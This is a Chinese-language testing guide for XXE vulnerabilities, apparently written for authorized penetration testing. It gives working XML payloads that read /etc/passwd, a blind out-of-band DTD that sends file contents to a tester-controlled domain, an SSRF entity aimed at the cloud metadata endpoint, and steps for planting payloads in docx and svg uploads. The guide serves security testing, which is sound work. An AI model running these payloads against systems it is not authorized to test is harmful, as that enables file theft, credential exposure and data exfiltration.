### XXE 测试策略

#### 1. 识别条件
- 接口请求体 `Content-Type: application/xml`、`text/xml`、`application/soap+xml`。
- 表单字段允许填写 XML 内容。
- 上传功能接受 `.xml`、`.docx`、`.xlsx`、`.svg`、`.pptx`、`.odt` 等**内部包含 XML** 的格式（Office 文档、SVG 本质是 XML）。
- 响应头 `Content-Type` 明确返回 XML 时，几乎总要检查是否解析了外部实体。

#### 2. 测试方法

**阶段一：回显 XXE（读文件）**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

将 `<data>` 替换为业务 XML 中**会被回显到响应**的字段（如 `<username>`、`<title>`）。

**阶段二：盲 XXE（带外通道）**

先在外部 HTTP 服务器托管 `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<自控域名>/?x=%file;'>">
%eval;
%exfil;
```

请求体：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<自控域名>/evil.dtd">
  %xxe;
]>
<root/>
```

在自控服务器日志中观察到 `/etc/passwd` 内容即确认。

**阶段三：SSRF via XXE**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

作为 SSRF 的一种变体。

**阶段四：办公文档 XXE**

- 将 `.docx`/`.xlsx` 解压，修改 `[Content_Types].xml` 或 `word/document.xml`，插入 XXE Payload，再重新打包上传。
- SVG 文件直接在 `<svg>` 内嵌 `<!DOCTYPE>` 与外部实体。

#### 3. 构造原则
- 保持原始请求的 Header（特别是 `Content-Type`、认证字段）。
- 实体名、外部 URL 使用**唯一标识**，便于在 DNSLog 日志中匹配。
- **禁止**使用递归实体炸弹（billion laughs），可能造成目标服务崩溃。

#### 4. 判定依据
- 响应包含 `/etc/passwd`、`win.ini` 等文件内容。
- DNSLog/HTTP 日志收到对应的回连请求且携带目标文件内容。
- 响应出现 XML 解析器错误但错误中带有实体解析迹象（如 `SYSTEM` 关键字相关报错）。

#### 5. 常见误报与排除
- 现代解析器默认禁用外部实体（Java 较新版本、libxml2 默认），测试失败是常态；不要因首次失败就下结论，多尝试不同格式（docx、svg）。
- 某些服务只解析 XML 结构但不处理 DTD，此时需要切换接口；同一应用的不同接口可能使用不同解析器。
